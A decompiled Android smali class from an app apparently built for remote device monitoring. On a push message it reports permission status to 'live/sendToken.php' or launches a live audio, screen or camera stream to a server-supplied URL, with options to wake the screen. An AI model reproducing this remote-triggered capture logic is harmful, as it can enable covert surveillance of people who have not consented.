.class final Lcom/app/service/MyFcmListenerServiceMTF$25;
.super Ljava/lang/Object;
.source "MyFcmListenerServiceMTF.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/app/service/MyFcmListenerServiceMTF;->a(Laja;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private synthetic a:[Ljava/lang/String;

.field private synthetic b:Lcom/app/service/MyFcmListenerServiceMTF;


# direct methods
.method constructor <init>(Lcom/app/service/MyFcmListenerServiceMTF;[Ljava/lang/String;)V
    .locals 0

    .line 1649
    iput-object p1, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->b:Lcom/app/service/MyFcmListenerServiceMTF;

    iput-object p2, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private a(Z)V
    .locals 5

    .line 1709
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "dateStart"

    .line 1710
    iget-object v2, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    const/4 v3, 0x3

    aget-object v2, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "live/getDateNow.php"

    .line 1712
    invoke-static {v1, v0}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 1713
    sget-object v0, Lcom/app/activity/liveRTC/LiveRTCActivity$b;->a:Lcom/app/activity/liveRTC/LiveRTCActivity$b;

    .line 1715
    iget-object v1, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    const/4 v2, 0x1

    aget-object v1, v1, v2

    const-string v3, "audio"

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 1716
    sget-object v0, Lcom/app/activity/liveRTC/LiveRTCActivity$b;->b:Lcom/app/activity/liveRTC/LiveRTCActivity$b;

    goto :goto_0

    .line 1717
    :cond_0
    iget-object v1, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    aget-object v1, v1, v2

    const-string v3, "screen"

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 1718
    sget-object v0, Lcom/app/activity/liveRTC/LiveRTCActivity$b;->c:Lcom/app/activity/liveRTC/LiveRTCActivity$b;

    .line 1721
    :cond_1
    :goto_0
    new-instance v1, Landroid/content/Intent;

    iget-object v3, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->b:Lcom/app/service/MyFcmListenerServiceMTF;

    invoke-virtual {v3}, Lcom/app/service/MyFcmListenerServiceMTF;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v4, Lcom/app/activity/liveRTC/LiveRTCActivity;

    invoke-direct {v1, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v3, 0x10000000

    .line 1722
    invoke-virtual {v1, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const v3, 0x8000

    .line 1723
    invoke-virtual {v1, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v3, 0x4000000

    .line 1724
    invoke-virtual {v1, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v3, "typeLive"

    .line 1725
    invoke-virtual {v1, v3, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    .line 1727
    iget-object v0, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    const/4 v3, 0x2

    aget-object v0, v0, v3

    const-string v3, "true"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    const-string v0, "frontFacing"

    .line 1728
    invoke-virtual {v1, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    :cond_2
    const-string v0, "runTimeMs"

    .line 1731
    iget-object v2, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    const/4 v3, 0x4

    aget-object v2, v2, v3

    invoke-virtual {v1, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 1733
    sget-object v0, Lcom/app/activity/liveRTC/LiveRTCActivity$c;->c:Lcom/app/activity/liveRTC/LiveRTCActivity$c;

    .line 1735
    iget-object v2, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    const/4 v3, 0x5

    aget-object v2, v2, v3

    const-string v4, "2"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 1736
    sget-object v0, Lcom/app/activity/liveRTC/LiveRTCActivity$c;->a:Lcom/app/activity/liveRTC/LiveRTCActivity$c;

    goto :goto_1

    .line 1737
    :cond_3
    iget-object v2, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    aget-object v2, v2, v3

    const-string v3, "3"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_4

    .line 1738
    sget-object v0, Lcom/app/activity/liveRTC/LiveRTCActivity$c;->b:Lcom/app/activity/liveRTC/LiveRTCActivity$c;

    :cond_4
    :goto_1
    const-string v2, "typeLiveAudio"

    .line 1741
    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    const-string v0, "turnScreenON"

    .line 1742
    invoke-virtual {v1, v0, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    const-string v0, "closeActivity"

    const/4 v2, 0x0

    .line 1743
    invoke-virtual {v1, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    const-string v0, "urlLIVE"

    .line 1744
    iget-object v2, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    const/4 v3, 0x7

    aget-object v2, v2, v3

    invoke-virtual {v1, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    if-nez p1, :cond_5

    const/high16 p1, 0x800000

    .line 1747
    invoke-virtual {v1, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 1750
    :cond_5
    iget-object p1, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->b:Lcom/app/service/MyFcmListenerServiceMTF;

    invoke-virtual {p1, v1}, Lcom/app/service/MyFcmListenerServiceMTF;->startActivity(Landroid/content/Intent;)V

    :cond_6
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 4

    .line 2186
    :try_start_0
    invoke-static {}, Lcom/app/activity/MyApp;->a()Lcom/app/activity/MyApp;

    move-result-object v0

    invoke-virtual {v0}, Lcom/app/activity/MyApp;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "android.permission.CAMERA"

    invoke-static {v0, v1}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    .line 2187
    invoke-static {}, Lcom/app/activity/MyApp;->a()Lcom/app/activity/MyApp;

    move-result-object v1

    invoke-virtual {v1}, Lcom/app/activity/MyApp;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "android.permission.RECORD_AUDIO"

    invoke-static {v1, v2}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    const/4 v2, 0x1

    if-nez v0, :cond_1

    if-eqz v1, :cond_0

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 v0, 0x1

    :goto_1
    if-eqz v0, :cond_2

    .line 1654
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "idPhone"

    .line 1655
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->b:Lcom/app/service/MyFcmListenerServiceMTF;

    invoke-virtual {v3}, Lcom/app/service/MyFcmListenerServiceMTF;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lda;->f(Landroid/content/Context;)I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "token"

    .line 1656
    sget-object v2, Lcw;->r:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "live/sendToken.php"

    .line 1657
    invoke-static {v1, v0}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    goto/16 :goto_4

    .line 1660
    :cond_2
    sget-boolean v0, Lcom/app/service/RecordCallService;->a:Z

    const/4 v1, 0x5

    if-eqz v0, :cond_3

    iget-object v0, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    aget-object v0, v0, v1

    const-string v3, "1"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    .line 1661
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "idPhone"

    .line 1662
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->b:Lcom/app/service/MyFcmListenerServiceMTF;

    invoke-virtual {v3}, Lcom/app/service/MyFcmListenerServiceMTF;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lda;->f(Landroid/content/Context;)I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "token"

    .line 1663
    sget-object v2, Lcw;->q:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "live/sendToken.php"

    .line 1664
    invoke-static {v1, v0}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    goto/16 :goto_4

    .line 1667
    :cond_3
    sget-boolean v0, Lcom/app/service/AudioRecordService;->a:Z

    if-eqz v0, :cond_4

    iget-object v0, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    aget-object v0, v0, v1

    const-string v1, "1"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4

    .line 1668
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "idPhone"

    .line 1669
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->b:Lcom/app/service/MyFcmListenerServiceMTF;

    invoke-virtual {v3}, Lcom/app/service/MyFcmListenerServiceMTF;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lda;->f(Landroid/content/Context;)I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "token"

    .line 1670
    sget-object v2, Lcw;->q:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "live/sendToken.php"

    .line 1671
    invoke-static {v1, v0}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    goto/16 :goto_4

    .line 1674
    :cond_4
    :try_start_1
    iget-object v0, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->b:Lcom/app/service/MyFcmListenerServiceMTF;

    new-instance v1, Landroid/content/Intent;

    const-string v3, "stopActivityCall"

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lcom/app/service/MyFcmListenerServiceMTF;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :catch_0
    move-exception v0

    .line 1676
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 2690
    :goto_2
    iget-object v0, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    const/4 v1, 0x6

    aget-object v0, v0, v1

    const-string v1, "1"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    .line 2694
    iget-object v1, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->a:[Ljava/lang/String;

    aget-object v1, v1, v2

    const-string v2, "screen"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_7

    if-nez v0, :cond_6

    .line 2695
    iget-object v1, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->b:Lcom/app/service/MyFcmListenerServiceMTF;

    invoke-virtual {v1}, Lcom/app/service/MyFcmListenerServiceMTF;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Les;->c(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_5

    goto :goto_3

    .line 2698
    :cond_5
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "idPhone"

    .line 2699
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcom/app/service/MyFcmListenerServiceMTF$25;->b:Lcom/app/service/MyFcmListenerServiceMTF;

    invoke-virtual {v3}, Lcom/app/service/MyFcmListenerServiceMTF;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lda;->f(Landroid/content/Context;)I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "token"

    .line 2700
    sget-object v2, Lcw;->t:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "live/sendToken.php"

    .line 2701
    invoke-static {v1, v0}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    goto :goto_4

    .line 2696
    :cond_6
    :goto_3
    invoke-direct {p0, v0}, Lcom/app/service/MyFcmListenerServiceMTF$25;->a(Z)V

    goto :goto_4

    .line 2704
    :cond_7
    invoke-direct {p0, v0}, Lcom/app/service/MyFcmListenerServiceMTF$25;->a(Z)V
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_1

    return-void

    :catch_1
    move-exception v0

    .line 1682
    invoke-static {v0}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    .line 1683
    invoke-virtual {v0}, Ljava/lang/Throwable;->getStackTrace()[Ljava/lang/StackTraceElement;

    :goto_4
    return-void
.end method
